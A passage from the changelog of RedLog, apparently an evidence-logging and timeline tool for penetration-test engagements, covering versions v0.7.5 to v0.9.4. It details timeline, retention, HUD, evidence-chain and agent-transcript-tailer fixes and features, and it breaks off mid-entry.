The catch now logs anything that is not a `SyntaxError` — a gate that fails
open must not fail quietly.

### 2. Timeline lanes clipped with no scrollbar (P0-2)

The lane stack was `overflow-hidden` with a 36px floor per lane. 18 lanes need
648px + a 28px axis; after the header, minimap and event list a 1080p window
leaves the track ~400px, so roughly the bottom third — `scope`, `process`,
`system` — was cut off with no scrollbar and no indication. Scope violations,
a headline feature, could be invisible.

The overflow moved to the shared parent of the labels and the track (putting
it on the track alone would slide the lanes out from under their labels).
While the stack overflows, `deltaY` drives the vertical axis and `shift+wheel`
keeps the horizontal scroll it does otherwise; with no overflow — the common
case — wheel behaviour is unchanged.

### 3. Markers rendered outside the track (P0-3)

The time domain came from `events[0].timestamp` / `events[last].timestamp`,
but dots are positioned with `displayTs()`, which honours a marker's
`atTimestamp` override. A marker dropped outside the current event range got a
negative `toX()` or one past `TRACK_W` and vanished. Measured against the
pre-fix build: a marker 30 minutes ahead rendered at **x=30976 on a 2200px
track**. The domain is now an O(n) scan of `displayTs` — same order as the
`bins` / `laneEvents` memos that already re-run on every change. The minimap
histogram bins on `displayTs` too, so it agrees with the track.

### 4. Retention never ran in a packaged build (P0-4)

`sweepRetention` was loaded through a runtime `require('../core/retention')`.
Rollup cannot see through it, so the module was never bundled and the literal
require survived into `out/main/index.js`, resolving against a non-existent
`out/core/`. Every `startProject()` threw `MODULE_NOT_FOUND`:

```
[retention] sweep failed: Error: Cannot find module '../core/retention'
```

`terminal.castKeepDays` and `screenshots.keepDays` had no effect in any shipped
build — `.cast` files (up to 50 MB each) and screenshots grew without bound,
and the `system.cast_pruned` / `system.screenshot_pruned` audit events that
explain a deleted file were never written. Unit tests missed it because they
import `core/retention` directly and never go through the bundle. Now a static
import, like every other core module.

The justifying comment was also wrong: it claimed "same pattern as
recoverOrphanSessions above", but that is a static import.

### 5. HUD drifted left and clipped its content (P0-5)

Operator report: "content is mangled and it's in the wrong place". Three
defects in the `overlay:autosize` contract:

- **One-directional x correction.** The main side only ever slid the HUD
  *left* to keep a widening window on screen, never restoring it when the
  window narrowed. Measured: from `x=1309`, growing to 720px moved it to
  `x=1080`, and shrinking back to 440px left it at `x=1080` — a permanent
  229px drift, repeated on every scale change until it pinned against the
  screen edge. Now anchored to whichever display edge the HUD sits nearer, so
  width changes are symmetric.
- **Width was guessed.** `OverlayApp` reported `440 * scale (+44)`, which read
  the **raw** config value while the render clamps to `[0.75, 2]`, and could
  not know the real content width — a long external IP, a Wi-Fi name or an
  active pivot route all overflow 440px and were clipped by the panel's
  `overflow: hidden`. Now measured via `scrollWidth`, with the formula as a
  floor. The compact bar's redundant second `overflow: hidden` was removed so
  the measurement is possible; the panel above it already clips.
- **Hard 720px ceiling.** Settings offers HUD scale up to 1.5, which with
  emphasised IP needs ~726px — past the cap, guaranteed clipping. The ceiling
  now scales with the display (`max(720, 60% of the work area)`). The height
  ceiling had the same class of bug: it came from the **primary** display
  regardless of which screen the HUD was on. Both now resolve the HUD's actual
  display once and share it.

### 6. Docs: architecture, audit, roadmap, I/O design note

Four new pages under `docs/`, indexed from `docs/README.md`:

- **`ARCHITECTURE.md`** — process/layer model, startup order, schema and
  migration strategy, capture pipeline end to end, tailer host, evidence
  chain, export, plugin system, IPC conventions. Replaces the README's ASCII
  diagram, which predated the tailer host, plugin host, marketplace and cloud
  share.
- **`AUDIT-2026-08-08.md`** — the standing defect list, each item tagged
  verified/reported. P0 tier now closed; trust-model, presentation, test-
  coverage and doc-drift tiers remain open.
- **`ROADMAP.md`** — v0.9.4 → v1.0 with an explicit 1.0 gate, plus what is
  deliberately not planned.
- **`timeline-io-visibility.md`** — design note (proposed). Which sources
  capture input/output today, the seven gaps, and the `io_ref` sidecar +
  transcript-view proposal. Keeps the v0.6.47 invariant: bytes on disk, hash
  in the chain.

README's lane count (7/15 → 18) and MCP tool count (12 → 18) corrected against
the source.

### 7. macOS builds are Apple Silicon only

`electron-builder.yml` drops the `x64` mac target. Intel Macs are past the
point where an unsigned, unnotarised dev-tool build is worth the release
weight and the doubled artifact size. Windows x64 is unchanged. The in-app
updater reads only `tag_name` / `html_url`, so nothing downstream depends on
the removed asset names.

README's download table now tracks the current version instead of the
hard-coded v0.7.0 links it carried since that release.

### 8. `chain verify` no longer reports tampering on a fresh project

Found running RELEASE_CHECKLIST §13. `verifyLatestAnchor()` returns
`ok: false` when there is no anchor at all, which is correct as far as "nothing
has been verified" goes — but the consumers could not tell that apart from "the
anchor disagrees with the chain":

- the CLI printed **`MISMATCH — investigate`** and exited **2**, so
  `chain verify` was a permanent red in any CI gate until the first hourly
  anchor landed, and told the operator to investigate a non-problem;
- the MCP tool handed agents a bare `{ok: false}`, so an agent following the
  shipped `redlog-pentest` skill would report a broken evidence chain on a
  brand-new engagement.

The Settings panel already branched on `anchor === null` and got this right.
`verifyLatestAnchor()` now also returns `noAnchor`, and the CLI has its own
branch: `NO ANCHOR YET — nothing to verify against`, exit 0, pointing at
`chain anchor` and `chain verify --full`. The `ok` semantics are unchanged, so
no existing consumer shifts.

### 9. CLI smoke coverage

`redlog-cli` had no automated tests — `redlog-sign` was the only covered
binary, which is how §8 shipped. `e2e/cli-smoke.spec.ts` now drives 18
commands against a live app (whoami / status / health / mark / log / search /
recording pause+resume / quickmark add+list / screenshot / operators / chain
status+verify+verify --full+anchors / sanitize --dry-run / export bundle),
asserts `replay` refuses a non-builtin-terminal event by name, and asserts
`chain verify` stays exit 0 on a never-anchored project. Mirrors
RELEASE_CHECKLIST §13.

### Tested

- 439/439 unit tests green; `npm run build` clean.
- **26/26 E2E** (was 17). New: `e2e/timeline-geometry.spec.ts` (P0-1, P0-2,
  P0-3, P0-4), `e2e/hud-overlay.spec.ts` (P0-5) and `e2e/cli-smoke.spec.ts`.
- RELEASE_CHECKLIST §0, §13, §15 run clean and are now automated; i18n is
  764/764 aligned with no mojibake, all 669 static `t()` keys resolve, and the
  9 dynamic `t(\`…\`)` prefix families each resolve to real keys.
- Every fix A/B-verified: reverting it makes the corresponding test fail with
  the original symptom — `ReferenceError: os is not defined`, scroll container
  not found, dot at x=30976, `Cannot find module '../core/retention'`, window
  pinned at 720px.

## v0.9.3 — 2026-08-08
**Timeline UX push driven by v0.9.2's subagent design review.** Three
items shipped: the highest-signal design finding (agent-session
collapse), the highest-signal discoverability fix (`?` cheatsheet
modal), and a real correctness bug the review's function agent spotted.
All renderer-only; no DB / chain / event-shape changes.

### 1. `?` keyboard-shortcut cheatsheet (design-review top item)
- Global `?` keybinding + a visible `?` button in the header opens a
  modal listing every shortcut RedLog has shipped since v0.6.90 —
  grouped by task (filter / focus / timeline / detail / misc). Design
  agent graded discoverability **F**: `⌘K` palette, `f` focus chain,
  right-click drop-marker, Alt-click solo, and half a dozen others
  were invisible without a teammate.
- Modal reuses the ⌘K palette overlay pattern (backdrop click / Esc
  close, `?` toggles). 13 shortcut rows across 5 groups.
- +14 i18n keys per language (en + zh-TW).

### 2. Agent-session collapse toggle
- New header chip `⇗ collapse agent`. When on, per-turn agent event
  subtypes (user_message / assistant_message / tool_call / tool_result
  / thinking / compact_summary / tool_interrupted / away_summary) are
  dropped from the render pipeline. `transcript_snapshot` and
  `session_end` stay visible — the session-level view. A 500-turn
  Claude session goes from **500 dots → 2-4 dots** on the agent lane.
- Off by default (existing operators don't lose visibility on upgrade).
  Per-project persisted via localStorage. Hidden-count shown on the
  chip so the empty agent lane doesn't look broken.
- Deliberately simpler than a full "collapse into session-header
  dot" (which would require re-plumbing cluster / `_causes` / focus
  chain traversal). v0.9.4+ can layer the header-dot on top if
  operators want more.

### 3. `recording_paused` band-overwrite bug fix (correctness)
- Function-review agent spotted: two consecutive `recording_paused`
  events without a `recording_resumed` between them silently
  overwrote the first band, losing it. Now: the first band closes at
  the second pause's timestamp — both pause events stay visible in
  the track as adjacent bands. Audit-truthful (recording was paused
  twice, never resumed in between) rather than fabricating a resume.
- 1 file, ~15 lines, no test change (bands are visual — verified by
  operator eyeball on shipped DMG).

### Tested
- tsc clean; 439/439 tests green.
- Electron renderer changes; browser-preview verification path
  doesn't apply (no `window.redlog` in vite dev shell). Operator
  verifies by installing the shipped DMG.

## v0.9.2 — 2026-08-08
**Agent event operator UX polish.** Timeline agent events previously
rendered as bare `agent: user_message` labels — the actual prompt /
response text was only reachable via the raw-JSON toggle. Now the
lane row shows a role glyph + inline preview (truncated to 100 chars
with `…`), and the detail panel renders the full body with the same
collapsible/copy-full affordances shell command output uses.

### A — `eventTitle` case for `agent`
- Role-tagged one-liners per subtype: `❯ user: …` / `◂ asst: …` /
  `⚙ tool_name: hint` / `↩ result: …` / `💭 thinking` /
  `⇉ context compacted` / `⏹ tool interrupted` / `⌛ away summary`.
- Housekeeping subtypes (transcript_snapshot / session_end /
  transcript_compacted / schema_drift / parent_missing) get their
  own summary lines instead of the useless `agent: <subtype>` fallback.
- New `firstStringArg` helper reuses the built-in tool-command picker
  order (command, file_path, path, url, query, pattern) so what shows
  in the lane matches what the sensitive-path masking cache sees.

### B — `AgentTurnDetail` component
- Rendered in the detail panel for every `agent.*` event.
- user_message / assistant_message / thinking → `CollapsibleStream`
  on the `full` payload (falls back to `preview` when full absent),
  `startOpen`, correct byte size + truncated indicator, copy-full
  button for > 4 KB.
- tool_call → `CollapsibleStream` on pretty-printed `tool_input` JSON.
- tool_result → `CollapsibleStream` on `output`, byte-accurate against
  `output_length` from the emitter.
- Metadata grid: agent, session_id, model, tool_use_id,
  transcript_uuid, usage tokens, post_compact, is_sidechain.

### i18n
- +5 keys per language: `timeline.detail.agentUser` /
  `.agentAssistant` / `.agentThinking` / `.agentToolInput` /
  `.agentToolOutput`. en + zh-TW updated.

### Tested
- tsc clean; 439/439 tests green (no test regressions — this is a
  render-layer change, verifiable by installing the shipped DMG and
  clicking any recent agent event in Timeline).
- Renderer-only, no DB schema / chain shape change — pre-existing
  agent events land in the new UI unchanged on first upgrade.

## v0.9.1 — 2026-08-07
**Target extractor audit-trail attribution.** Mirrors v0.9.0's loot
pattern attribution to target-extractor plugins: when a plugin's
extractor rule matches a shell command, the resulting shell event now
carries `extractor_plugin_id` + `extractor_name` so an audit reviewer
can trace back to the exact plugin rule. Built-in extractors leave
the two fields unset — byte-identical shape for the built-in path,
no chain-hash regression.

### A — Attribution on shell events
- `TargetExtractorContribution` gains optional `name?: string` +
  `description?: string` fields (v0.9.0 A pattern applied to the
  extractor domain). Missing `name` defaults to `${cmd}#${index}`.
  ([`types.ts:60`](src/core/plugins/types.ts:60))
- New `extractTargetWithProvenance(cmd)` returns
  `{ host, pluginId?, extractorName? }`. `extractTarget(cmd)` is now
  a thin `.host` shim for callers that don't care about provenance
  (CDP target-id resolution).
  ([`target-extractor.ts:112`](src/core/target-extractor.ts:112))
- `api-server.ts` shell handler uses the provenance version and
  stamps `extractor_plugin_id` + `extractor_name` on shell event data
  when a plugin extractor matched.
- New `listExternalTargetExtractors()` snapshot API for future
  Settings ▸ Plugins UI + audit-bundle export.
- `recon-pack` example updated with `name` + `description`.

### Test coverage (+5)
- Plugin match carries pluginId + default `${cmd}#N` when name omitted.
- Built-in match leaves both fields undefined (chain-shape stable).
- Two plugins with the same cmd matcher are distinguishable at
  match time (plugin-registration order = first-match wins, falls
  through when extract regex doesn't fire).
- `listExternalTargetExtractors` snapshot exposes cmd/extract/name.
- `extractTarget` backward-compat shim still returns just the host.
- 434 → 439 tests, all green; tsc clean.

## v0.9.0 — 2026-08-07
**Loot pattern audit-trail attribution.** Third-party loot patterns
now carry per-match `plugin_id` + `pattern_name` on emitted events so
an audit reviewer can trace exactly which plugin's rule flagged a
given credential — the "who fired?" question was previously
unanswerable when two plugins both contributed patterns of the same
`type`. Minor bump because the `LootPatternContribution` schema
gained optional `name` / `description` fields; existing plugins
continue to work unchanged (older shape → `pattern_name` defaults to
`${type}#${index}`, still traceable).

### A — Attribution on matched loot events
- New optional fields on `LootPatternContribution`:
  `name?: string` (per-pattern identifier within the plugin) and
  `description?: string` (what the pattern is meant to detect).
  ([`types.ts:25`](src/core/plugins/types.ts:25))
- `LootDetector.findMatches` now stamps `pluginId` + `patternName` on
  matches from plugin-contributed patterns. Built-in matches carry
  neither field — event shape is **byte-identical** to pre-v0.9.0 for
  built-in loot, so no chain-hash regression.
  ([`loot-detector.ts:75`](src/core/loot-detector.ts:75))
- `LootDetector.emit` propagates the pair into the emitted event's
  `matches[]` entries: `{ type, confidence, preview, plugin_id?,
  pattern_name? }`.
- New `listExternalLootPatterns()` snapshot API returns
  `{ pluginId, patternName, type, pattern, flags, confidence,
  description }[]` for a future Settings ▸ Plugins pattern-list UI
  (v0.9.x) and for audit-bundle export.
- `recon-pack` example now demos the `name` + `description` fields.

### Test coverage (+4)
- Plugin-contributed matches carry `pluginId` + default
  `${type}#${index}` `patternName` when `name` omitted.
- Built-in matches leave both fields undefined (chain-shape stable).
- Two plugins registering the same `type` are distinguishable at
  match time.
- `listExternalLootPatterns` exposes name/description/flags for
  Settings + export.
- 430 → 434 tests, all green; tsc clean.

### What v0.9.0 does NOT do (defer to v0.9.x tail)
- No Settings ▸ Plugins UI to browse the pattern list (the snapshot
  API is ready; the UI ships when we land the Loot panel refresh).
- No invalid-regex advisory event — bad regexes are still silently
  skipped. Adding a `system` advisory event needs threading
  engagement/operator into `registerLootPatterns`; not worth it
  before there's a Settings surface to display it.
- v0.9.0 B (target-extractor attribution) + v0.9.0 C (bugbounty-
  lexicon example) queued for follow-up ships.

## v0.8.3 — 2026-08-07
**OpenCode live-tail closes the v0.8.1 known limitation.** A new
`adapter.init(host)` lifecycle hook + `host.emitTurns(...)` control
surface let adapters inject supplemental turns from sources the host
doesn't natively watch. OpenCode uses this to attach a secondary
chokidar watcher on `storage/part/` so tool_call/tool_result deltas
that land AFTER the msg stub was first observed now surface as
first-class audit events instead of waiting for a project re-open.

### A — `TailerAdapter.init(host)` + `HostControlSurface`
- New optional lifecycle hook `init?(host: HostControlSurface): void`
  fires once when the adapter is registered. Host guards against
  duplicate init on re-register; adapters clean up their own watchers.
- `HostControlSurface.emitTurns(agentKind, sessionId, turns[])` runs
  the injected turns through the same dedup (`redlogIdByUuid`),
  redaction, and chain-linking as `parseUnit`-produced turns.
- Re-emitting a turn with an already-seen uuid is a **safe no-op**
  (canonical idempotent-emit pattern). Emit into a session that
  hasn't been registered yet is silently dropped; adapter is expected
  to retry via its watcher.
- Emit respects `eventBus.paused` — no bypass of the recording gate.

### B — OpenCode `storage/part/` secondary watcher
- Adapter's `init` opens a chokidar watch on `<storage>/part/`.
- New / changed `prt_*.json` → parses via extracted `partToTurns`
  helper → calls `host.emitTurns('opencode', sessionID, turns)`.
- Handles both `add` (new part landing) and `change` (tool part
  rewritten from `pending` → `completed` with output). The tool_call
  is dedup-skipped on the second fire; only the newly-available
  tool_result actually emits.

### Test coverage (+7)
- `partToTurns` (6 unit tests): reasoning, pending tool, completed
  tool, text (no re-emit), unknown types, error status.
- `host.emitTurns` end-to-end: initial catch-up produces msg +
  tool_call only; injected delta lands as chain-linked tool_result;
  re-emitting the same uuid is dedup'd (no duplicate row).
- 423 → 430 tests, all green; tsc clean.

### Known limitation removed
v0.8.1 CHANGELOG's "OpenCode parts landing after msg stub not
re-scanned" — closed.

## v0.8.2 — 2026-08-07
**`tailers` plugin contribution type.** The `TailerAdapter` interface is
now a plugin contribution — bundled plugins can register transcript
adapters via `plugin.json` instead of a hard-coded main-init call.
Third-party (user-source) `tailers` are rejected with an advisory
until per-plugin isolation lands (v0.8.3+). No user-facing behaviour
change — the three in-tree adapters continue to register the same way.

### A — Interface additions
- `PluginContributes.tailers?: string` — manifest-relative path to a
  module that `export`s `const adapter: TailerAdapter`. Adding this
  key makes the plugin **🔴 privileged tier** (content-hash pinning +
  trust gate). ([`types.ts:118`](src/core/plugins/types.ts:118))
- New extension point `src/core/plugins/tailer-registry.ts` — main
  wires its `registerAdapter` / `unregisterAdapter` in at boot via
  `setTailerContributionSink(...)`. Duck-typed on the core side so
  `src/core/` has no dependency on `src/main/services/`.
- `contributions.ts::applyContributions` requires the tailer module,
  extracts `adapter.agentKind`, and hands off to the sink. On
  `removeContributions` the corresponding `unregisterAdapter` fires.

### v0.8.2 restriction — bundled only
User plugins that declare `tailers` produce a `console.warn` advisory
and are otherwise skipped. Rationale: `parseUnit` runs at
transcript-line rate and does sync fs I/O — the existing MCP-tool
`utilityProcess` isolation adds too much per-call overhead to be
practical here, and we won't ship user code in-process without a
proper sandbox. v0.8.3+ picks the isolation model (fast IPC worker
vs. per-plugin JS eval sandbox) and lifts the restriction.

### Test coverage (+4)
- `tailer plugin contribution → sink registration + withdrawal`
- `user-source plugin with tailers is REJECTED with no sink call`
- `plugin classified as privileged when only tailers present`
- `changing tailer code invalidates the pinned trust hash`
- 419 → 423 tests, all green; tsc clean.

### What v0.8.2 does NOT do
- No migration of in-tree adapters to `plugins/*` yet (task 277
  remains open; deferred to v0.8.3+ so the bundled-plugin pipeline can
  land alongside the isolation story).
- No marketplace UI changes for tailer plugins yet — the manifest
  schema is now aware, but the browse tab hasn't gained a filter chip.

## v0.8.1 — 2026-08-07
**Codex + OpenCode adapters on top of the v0.8.0 tailer host.** The
`TailerAdapter` interface established in v0.8.0 (and hardened in
v0.8.0.1) now proves out with two real-world adapters — a JSONL-line
adapter (Codex CLI) and a per-message-directory adapter with a split
metadata/content layout (OpenCode). Both are registered by default;
when the corresponding agent's on-disk transcript root is missing, the
adapter's watcher no-ops and the app degrades gracefully.

### A — Codex CLI adapter ([`adapters/codex.ts`](src/main/services/adapters/codex.ts))
- Watches `~/.codex/sessions/YYYY/MM/DD/rollout-*.jsonl`.
- Parses Codex's `{type: 'session_meta'|'response_item', payload}` wire
  format into RedLog's per-turn event shape.
- Ingests: `message` (role user/assistant/developer), `agent_message`,
  `user_message`, `function_call`, `function_call_output`, `reasoning`,
  `context_compacted`, `custom_tool_call`, `custom_tool_call_output`,
  `web_search_call`, `web_search_end`, `patch_apply_end`,
  `exec_command_end`.
- Ignores: `task_started`, `task_complete`, `thread_name_updated`,
  `token_count`.
- Codex has no wire-level `uuid`/`parentUuid`. We synthesise:
  - `function_call` → uuid `codex:fc:<call_id>`
  - `function_call_output` → uuid `codex:fco:<call_id>`, parentUuid
    `codex:fc:<call_id>` (chain-links the two)
  - everything else → uuid `codex:<sha256_short(raw_line)>`

### B — OpenCode adapter ([`adapters/opencode.ts`](src/main/services/adapters/opencode.ts))
- Watches `~/.local/share/opencode/storage/message/` (per-message-dir).
- Session dirs (`ses_<sid>`) are direct children (uses v0.8.0.1 B2's
  depth guard). Each msg stub `msg_<mid>.json` inside is one "unit".
- The msg stub carries only metadata; content lives in
  `storage/part/msg_<mid>/prt_*.json`. The adapter reads those sibling
  files via the v0.8.1 `parseUnit(raw, sourcePath)` API extension.
- cwd is looked up from `storage/session/<projectHash>/ses_<sid>.json`.
- One msg fans out into an ARRAY of turns via the new
  `parseUnit → ParsedTurn[]` return shape: the message body + one
  `thinking` per reasoning part + one `tool_call` + `tool_result` pair
  per tool part. All share `opencode:msg:<mid>` as parent so the
  intra-message chain stays intact.

### Interface additions
- `TailerAdapter.parseUnit` gains an optional second arg `sourcePath`
  so adapters with sibling-file layouts (OpenCode) can locate the
  companion path. JSONL adapters (Claude, Codex) ignore it.
- `parseUnit` may now return `ParsedTurn | ParsedTurn[] | null`;
  arrays flush in order and each element carries its own parentUuid.
  Existing single-turn adapters (Claude, Codex) unchanged.

### Test coverage
- +11 Codex parser tests (`test/codex-adapter.test.ts`)
- +10 OpenCode parser tests (`test/opencode-adapter.test.ts`)
- +1 OpenCode end-to-end integration test in the tailer test file
  (proves the whole chain: dir watch → msg stub read → part assembly →
  emit → chain link tool_call ← tool_result). 397 → 419 tests.

### Known limitation (deferred to v0.8.2+)
OpenCode part files that land AFTER the msg stub was first observed
are not re-scanned. Dedup keys off filename, and the msg dir doesn't
change when new part files land in the sibling `part/` tree — so
live-tail sees the msg only once with whatever parts existed at that
moment. For post-hoc audit review this is fine (parts remain complete
on disk); live streaming will get a secondary chokidar watch on
`storage/part/` in v0.8.2+.

### What v0.8.1 does NOT change
- No user-facing config for enabling/disabling individual adapters —
  the `agentTailer.enabled` toggle in Settings still gates all three
  as a group. Per-adapter toggles land with the `tailer` plugin
  contribution type (v0.8.2+).
- Third-party plugin loading of tailers is still deferred to v0.8.2+
  (task 276/277). Codex + OpenCode are in-tree.

## v0.8.0.1 — 2026-08-07
**Post-extraction patch batch (F1-F5).** Fixes two chain-integrity bugs
and three OpenCode-adapter blockers found by subagent review of the
v0.8.0 extraction. No new features; no user action required. `v0.8.0.1`
because these fixes should not be delayed to a feature release, and
`v0.8.0` had already tagged.

### Chain-integrity fixes
- **F1** — `compact_summary` events no longer carry `preview` / `full`
  / `full_length` / `has_thinking`. v0.8.0 accidentally added this
  Claude message payload branch to `compact_summary`, which changed
  the hash-input shape (and thus the chain) for every operator who
  ran `/compact`. Restored to the pre-v0.8.0 shape.
  ([`tailer-host.ts:368`](src/main/services/tailer-host.ts:368))
- **F2** — the test-mode `registerSession(source, cfg)` shim no longer
  emits spurious `agent.session_end` events for live sessions. Old
  shim called `configureHost(...)` which triggered a full watcher
  restart; new shim uses a `setHostConfig` helper that mutates cfg
  without touching sessions.
  ([`agent-transcript-tailer.ts:274`](src/main/services/agent-transcript-tailer.ts:274))

### OpenCode-adapter blockers (unblocks v0.8.1)
- **B1** — per-message-layout `add` handler now drives `catchUpSession`
  when a new msg file lands in a known session dir. Old code only
  routed `.jsonl` file adds; a new `msg_*.json` inside an OpenCode
  session dir would fire no handler.
- **B2** — `addDir` now only registers directories that are DIRECT
  children of the watched root. Old code called `registerSession` on
  every dir chokidar surfaced (up to depth 6), including the root
  itself, so OpenCode's `storage/message/` would have become a
  session named `"message"` and every nested subdir a spurious
  session.
- **B3** — session-map keys are namespaced by `${agentKind}:${sessionId}`.
  Old code keyed by bare sessionId, so a Codex `rollout-abc` and a
  Claude `rollout-abc` would silently collide.
  ([`tailer-host.ts:204`](src/main/services/tailer-host.ts:204))

### Small correctness / cleanup
- Sidecar-as-index seed for per-message adapters no longer clobbers
  the DB-seeded real event ids with a `'__seen__'` sentinel — the
  guard checks `!redlogIdByUuid.has(name)` before writing.
- `unlinkDir` handler for per-message layouts (session-dir removed →
  `unregisterSession`).
- +2 regression tests (compact_summary payload absence + shim
  no-restart behaviour).

## v0.8.0 — 2026-08-07
**Tailer host extraction.** Minor bump — architectural refactor of the
agent-transcript-tailer to separate generic infrastructure from
per-agent parsing via a `TailerAdapter` interface. Zero user-visible
change; sets up v0.8.1 (Codex + OpenCode adapters) and v0.8.2+
(third-party tailer plugin API) as small delta additions.

### A — `tailer-host.ts` extraction (new, ~640 LOC)
- Owns: chokidar dir-watch, sidecar `<projectDir>/agent-transcripts/`
  append, redaction (via `secret-redaction.ts`), insertEvent wrapping,
  `_causes` resolution (`Map<transcriptUuid, redlogEventId>` per
  session), pending-parent buffer (cap 100 / TTL 60s from v0.7.5 G2),
  sensitive-path masking via sibling tool_call cache (v0.7.4 F1),
  snapshot event emission, session lifecycle (register / unregister
  / chokidar unlink), pause gate (v0.7.3 A2 + v0.7.4 F4),
  self-exclusion via `.redlog-app-root`.
- Supports two adapter layouts via `perMessageDir: boolean`:
  - `false` (default): each matching file is a JSONL stream, one
    unit per line (Claude Code, Codex CLI).
  - `true`: each matching file is one unit (OpenCode's
    `~/.local/share/opencode/storage/message/*.json`).
- Sidecar for per-message layout is an append-only index of processed
  filenames — restart-safe by construction.

### Claude Code adapter refactor (`agent-transcript-tailer.ts`, ~250 LOC)
- Now a thin file: Claude-Code-specific `KNOWN_INGEST_TYPES` /
  `KNOWN_IGNORED_TYPES`, `parseTranscriptLine`, `readTranscriptCwd`,
  `subtypeForClaude` → assembled as `claudeCodeAdapter: TailerAdapter`.
- `configureAgentTailer` / `startAgentTailer` / `stopAgentTailer` are
  preserved as compat wrappers around the host's `configureHost` /
  `startHost` / `stopHost`, so `main/index.ts` is unchanged.
- File shrinks from 973 LOC → ~250 LOC. All 20 tailer tests unchanged
  and green.

### What v0.8.0 does NOT change
- No new adapters yet (Codex + OpenCode land in v0.8.1)
- No third-party plugin contribution type (deferred to v0.8.2+ if
  demand surfaces — for now Codex/OpenCode will be in-tree adapters
  against the same `TailerAdapter` interface, which already
  demonstrates the abstraction)
- Zero operator-visible behaviour change

Tests: 395/395 unit. Typecheck clean.

## v0.7.7 — 2026-08-07
Operator UX polish + Settings surface for the plugin-native tailer
roadmap. Three quick wins; no architectural change (v0.8.0 will do
the plugin extraction).

### U1 — Settings ▸ AI Agents tab
- New Settings tab (`Settings.tsx:107`) — toggles the built-in
  Claude Code tailer and its `emitThinking` flag from the UI. Pre-
  v0.7.7 the only way to disable the tailer was editing the config
  YAML or the hard-coded fallback in main. Config schema gains
  `agentTailer: { enabled, emitThinking }` with defaults `true` /
  `false` (`config.ts:178`). Panel also documents the
  `.redlog-app-root` self-exclusion mechanism so operators know
  they can commit that file to opt a repo out of tailing.
- Shape prepared for v0.8.0: the same tab will list all installed
  tailer plugins with per-plugin toggles when the plugin API lands.

### U2 — `is_sidechain` badge + Timeline indent for subagent turns
- `computeBadges` (`Timeline.tsx:381`) now attaches `↪` when
  `evt.agentType === 'agent' && data.is_sidechain === true`. The
  flag was already emitted by the tailer since v0.7.2 but never
  keyed off in the UI — pre-v0.7.7 dogfood surfaced this as
  operator-facing gap #2 (Task subagent subtrees were visually
  identical to main-thread turns).
- Single-event dots for subagent turns get a 12px right nudge
  (`subagentIndentPx`, `Timeline.tsx:387`) so a burst of parallel
  subagent turns visually hangs off its parent instead of clobbering
  it. Only applies to single-event dots (clusters already carry a
  count label so the visual grouping is already there).

### U3 — `agent.transcript_snapshot` detail panel "Open sidecar" button
- Detail panel now shows a cyan `Open sidecar` button whenever the
  selected event is `agent.transcript_snapshot` with a
  `snapshot_path` field (`Timeline.tsx:2454`). One click opens the
  archived JSONL in Finder/Explorer via the existing
  `data.revealPath` IPC. Pre-v0.7.7 the sidecar was only reachable
  by digging the path out of the raw JSON view.

## v0.7.6 — 2026-08-07
Second dogfood-defect batch. Re-installed v0.7.5 DMG, verified all
v0.7.5 fixes landed in the shipped bundle (parent_missing 0.8% → 0.09%,
Dashboard tile refreshed, no new `last-prompt` drift). Three more real
bugs surfaced in the same pass; fixed here.

### H1 — Two more line types silenced
- Real Claude Code line types `frame-link` (1×) + `pr-link` (7×) added
  to `KNOWN_IGNORED_TYPES` in `agent-transcript-tailer.ts`. Same fix
  as v0.7.5 G1 — the shipped bundle stops emitting 8 spurious
  `agent.transcript_schema_drift` advisories per open.

### H2 — Dashboard "chain 10396 ≠ events 28338" scary warning
- v0.7.5 G3 refreshed the events + loot count tiles on every incoming
  event but missed `chainLen`. After the tailer added ~18K events
  post-open, `chainLen` stayed at its mount snapshot (10396) while
  `eventCount` raced ahead (28338). Dashboard rendered the diff as
  a red `⚠ 證據鏈 10396 ≠ 事件 28338` warning even though sqlite
  says every one of the 28338 rows has a non-null hash. Added
  `chain.length()` to the same `refreshCounts` sweep — one line,
  Dashboard drift closes to 0.

### H3 — `sample BROKEN` shows event age
- Pre-v0.7.6 the Dashboard just said `sample BROKEN` when a random
  sample verify hit a hash mismatch. Dogfood surfaced the exact
  scenario the operator can't tell apart: a **6-day-old
  system/ip_transition row from 2026-08-01** (pre-tailer, pre-v0.7,
  probably an old shape variant our verifier doesn't try) trips the
  same UI as a fresh regression. Now:
  - `CaptureHealth.lastSampleBroken.eventTimestamp` carries the
    broken row's creation timestamp (`main/index.ts` looks it up via
    `queryEventById` before calling `noteSampleBroken`).
  - Dashboard renders `sample BROKEN (6d old)` / `(3h old)` /
    `(fresh)` so operator triage is one glance instead of a DB dive.
  - Root cause of THIS specific mismatch is still open — likely a
    shape variant our v0.6.88 hash-check list doesn't cover — but
    the UX now discloses the age so an operator knows it's not a
    live regression.

### Verified in v0.7.5 dogfood (unchanged in v0.7.6)
- Self-exclusion via `.redlog-app-root`: 0 events for the RedLog dev
  session UUID across 28K total events. Marker works.
- Tailer scale: 15 real Claude Code sessions from BugBounty tree →
  15,433 assistant + 12,236 user + 60 snapshot + 14 compact-summary
  events, 81 sidecar files, ~50MB, all hashed.

## v0.7.5 — 2026-08-07
Dogfood defect batch. Installed v0.7.4 DMG, opened Test-Engagement,
let the tailer ingest 10-15 real Claude Code sessions (~9922 agent
events, 81 sidecar files, ~50MB). Three real bugs surfaced; one
pre-existing chain-sample issue deferred (not tailer-caused).

### G1 — `last-prompt` schema drift silenced
- Claude Code writes a `last-prompt` line-type record; dogfood fired
  6 spurious `agent.transcript_schema_drift` advisories on it. Added
  to `KNOWN_IGNORED_TYPES` (`agent-transcript-tailer.ts`) — pointer
  metadata, correctly skipped without noise.

### G2 — Pending-parent buffer restored
- Dogfood surfaced **79 `transcript_parent_missing` advisories**. The
  v0.7.2 design's "parent-first, assert-and-skip" assumption is
  empirically wrong for Claude Code (adversarial-review agent flagged
  the risk; empirical data made it definite). Added
  `pendingByParentUuid: Map<uuid, Array<{turn, queuedAt}>>` with
  hard cap 100 entries + 60s TTL. Children whose parents haven't
  landed yet queue; when the parent lands, the queue flushes
  recursively (grand-children resolve). Buffer cap OR TTL hit → fall
  back to pre-v0.7.5 "emit without _causes + advisory once" so a
  malformed stream can't exhaust memory.
- Effect: the 79 dropped chain edges in the dogfood become live
  `_causes` links; Timeline focus-chain (`f` hotkey) walks whole
  agent conversations end-to-end.

### G3 — Dashboard event count refreshes on new events
- Dashboard "事件" tile fetched `getCount()` once at mount then never
  updated. After the tailer ingested ~10K events post-open, the tile
  stayed at 483 while the DB and status bar both showed 9073+. Added
  `getCount()` refresh (also `loot.getCount()`) to the existing
  `onNew` subscription. Cheap — v0.6.97 C's in-memory count cache
